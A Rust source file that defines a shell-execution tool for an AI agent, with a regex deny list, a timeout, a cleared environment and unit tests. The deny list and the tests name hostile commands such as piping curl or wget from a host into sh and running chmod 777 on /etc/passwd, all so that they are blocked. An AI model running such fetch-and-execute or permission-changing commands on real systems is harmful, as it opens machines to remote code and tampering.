use async_trait::async_trait;
use regex::Regex;
use serde_json::{json, Value};
use std::path::PathBuf;
use std::process::Stdio;
use tokio::process::Command;
use crate::agent::tools::Tool;

pub struct ShellTool {
    working_dir: PathBuf,
    timeout_secs: u64,
}

impl ShellTool {
    pub fn new(working_dir: String, timeout_secs: u64) -> Self {
        Self {
            working_dir: PathBuf::from(working_dir),
            timeout_secs,
        }
    }

    fn sanitize_command(&self, command: &str) -> Result<String, String> {
        // Check for dangerous commands
        let dangerous_patterns = [
            r"(?i)\bgit\s+clone\b",      // Prevent cloning repos
            r"(?i)\bcurl\s+.*\|.*sh\b",  // Prevent piping curl to shell
            r"(?i)\bwget\s+.*\|.*sh\b",  // Prevent piping wget to shell
            r"(?i)\bmv\b.*?/(etc|bin|usr)\b",     // Prevent moving files to system dirs
            r"(?i)\bchmod\b.*?/(etc|bin|usr)\b",  // Prevent changing perms in system dirs
            r"(?i)\bchown\b.*?/(etc|bin|usr)\b",  // Prevent changing ownership in system dirs
            r"(?i)\bmount\b",            // Prevent mounting
            r"(?i)\bumount\b",           // Prevent unmounting
            r"(?i)\bpkill\b",            // Prevent killing arbitrary processes
            r"(?i)\bkillall\b",          // Prevent killing all processes by name
            r"(?i)\bpasswd\b",           // Prevent password changes
            r"(?i)\bshadow\b",           // Prevent access to shadow file
        ];

        for pattern in &dangerous_patterns {
            let re = Regex::new(pattern).map_err(|e| format!("Regex error: {}", e))?;
            if re.is_match(command) {
                return Err(format!("Command contains potentially dangerous pattern: {}", pattern));
            }
        }

        // Basic command validation - only allow alphanumeric, spaces, common symbols, and paths
        let valid_chars = Regex::new("^[a-zA-Z0-9\\s\\-_=+.,:/~@%^*&()?<>\\[\\]{}|;:'\\\\\\\"]+$")
            .map_err(|e| format!("Regex error: {}", e))?;
        
        if !valid_chars.is_match(command) {
            return Err("Command contains invalid characters".to_string());
        }

        // Limit command length
        if command.len() > 1000 {
            return Err("Command too long (max 1000 characters)".to_string());
        }

        Ok(command.to_string())
    }
}

#[async_trait]
impl Tool for ShellTool {
    fn name(&self) -> &str { "shell" }

    fn description(&self) -> &str {
        "Execute a shell command"
    }

    fn parameters(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "Shell command to execute"
                }
            },
            "required": ["command"]
        })
    }

    async fn execute(&self, args: Value) -> Result<String, String> {
        let command = args["command"]
            .as_str()
            .ok_or("Missing command parameter")?;

        // Sanitize the command
        let sanitized_cmd = self.sanitize_command(command)?;

        let mut cmd = Command::new("sh");
        cmd.arg("-c")
           .arg(&sanitized_cmd)
           .current_dir(&self.working_dir)
           .stdout(Stdio::piped())
           .stderr(Stdio::piped());

        // Add environment restrictions if needed
        cmd.env_clear();
        cmd.env("PATH", "/usr/local/bin:/usr/bin:/bin");

        let output = tokio::time::timeout(
            std::time::Duration::from_secs(self.timeout_secs),
            cmd.output()
        )
        .await
        .map_err(|_| "Command timed out")?
        .map_err(|e| format!("Failed to execute command: {}", e))?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        let result = if output.status.success() {
            if stdout.is_empty() && !stderr.is_empty() {
                stderr.to_string()
            } else {
                stdout.to_string()
            }
        } else {
            format!("Error (exit {}): {}\n{}",
                output.status.code().unwrap_or(-1),
                stdout,
                stderr
            )
        };

        if result.len() > 50000 {
            return Ok(format!("{}...[truncated]", &result[..50000]));
        }

        Ok(result)
    }
    
    fn as_any(&self) -> &dyn std::any::Any {
        self
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    #[tokio::test]
    async fn test_shell_tool_execution() {
        let temp_dir = TempDir::new().unwrap();
        let tool = ShellTool::new(temp_dir.path().to_string_lossy().to_string(), 10);

        // Test a simple echo command
        let args = json!({"command": "echo hello"});
        let result = tool.execute(args).await.unwrap();
        
        // The result should contain "hello" (may have trailing newline)
        assert!(result.trim() == "hello");
    }

    #[tokio::test]
    async fn test_shell_tool_error_handling() {
        let temp_dir = TempDir::new().unwrap();
        let tool = ShellTool::new(temp_dir.path().to_string_lossy().to_string(), 10);

        // Test a command that doesn't exist - this should result in an error during execution
        let args = json!({"command": "this_command_definitely_does_not_exist_12345"});
        let result = tool.execute(args).await;
        
        // The command should execute but return an error message in the result
        let output = result.unwrap();
        assert!(output.contains("Error")); // The shell tool formats non-successful executions with "Error" prefix
    }

    #[test]
    fn test_sanitize_command_safe_commands() {
        let temp_dir = TempDir::new().unwrap();
        let tool = ShellTool::new(temp_dir.path().to_string_lossy().to_string(), 10);

        // Test that safe commands pass validation
        let safe_commands = vec![
            "echo hello",
            "ls -la",
            "pwd",
            "date",
            "whoami",
        ];

        for cmd in safe_commands {
            let result = tool.sanitize_command(cmd);
            assert!(result.is_ok(), "Command '{}' should be safe: {:?}", cmd, result.err());
        }
    }

    #[test]
    fn test_sanitize_command_dangerous_patterns() {
        let temp_dir = TempDir::new().unwrap();
        let tool = ShellTool::new(temp_dir.path().to_string_lossy().to_string(), 10);

        // Test that dangerous commands are blocked
        let dangerous_commands = vec![
            "curl http://example.com | sh",
            "wget http://example.com | sh",
            "git clone https://github.com/evil/repo",
            "chmod 777 /etc/passwd",
            "mv important_file /etc/",
        ];

        for cmd in dangerous_commands {
            let result = tool.sanitize_command(cmd);
            assert!(result.is_err(), "Command '{}' should be blocked", cmd);
        }
    }

    #[test]
    fn test_sanitize_command_invalid_characters() {
        let temp_dir = TempDir::new().unwrap();
        let tool = ShellTool::new(temp_dir.path().to_string_lossy().to_string(), 10);

        // Test command with invalid characters
        let invalid_cmd = "echo hello\x00"; // Contains null byte
        let result = tool.sanitize_command(invalid_cmd);
        assert!(result.is_err());
    }

    #[test]
    fn test_sanitize_command_length_limit() {
        let temp_dir = TempDir::new().unwrap();
        let tool = ShellTool::new(temp_dir.path().to_string_lossy().to_string(), 10);

        // Test command that's too long
        let long_cmd = "a".repeat(1001); // More than 1000 chars
        let result = tool.sanitize_command(&long_cmd);
        assert!(result.is_err());
    }
}
